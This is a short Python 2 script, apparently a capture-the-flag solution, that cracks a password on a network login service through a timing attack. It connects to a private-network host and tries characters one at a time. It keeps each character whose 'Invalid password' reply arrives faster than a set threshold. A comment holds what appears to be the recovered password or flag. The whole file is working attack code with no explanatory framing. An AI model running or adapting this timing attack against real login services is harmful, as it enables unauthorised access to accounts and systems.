import struct
import time
from TCPClient import *


server = "192.168.1.82"
port = 54311

def CharRange(c1, c2):
	"""Generates the characters from `c1` to `c2`, inclusive."""
	lst = []
	for c in xrange(ord(c1), ord(c2)+1):
		lst.append(chr(c))
	return lst

def CheckLoginReponse(response):
	if ("Invalid password!" in response):
		return False
	return True

#R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
def CrackPassword():
	con = TCPClient(server, port)
	posChars = CharRange('a', 'z')
	posChars += CharRange('A', 'Z')
	posChars += CharRange('0', '9')
	password = ''
	done = False
	hdr = con.recv(1024)
	hdr = con.recv(23)	
	while not done:
		for char in posChars:
			con.sendline(password + char)
			startTime = time.time()			
			response = con.recvline()			
			endTime = time.time()
			dif = endTime - startTime
			#print "%s %.10f %s" % (password+char, dif, response.strip())
			if(dif < 0.0005):
				print "%s %s %.10f" % (password, char, dif)
				password += char
			done = CheckLoginReponse(response)
			if(done):
				break
	return password
		


if __name__ == "__main__":
	print "[*] Running timing attack..."
	pw = CrackPassword()
	print "[*] Password found! %s" % pw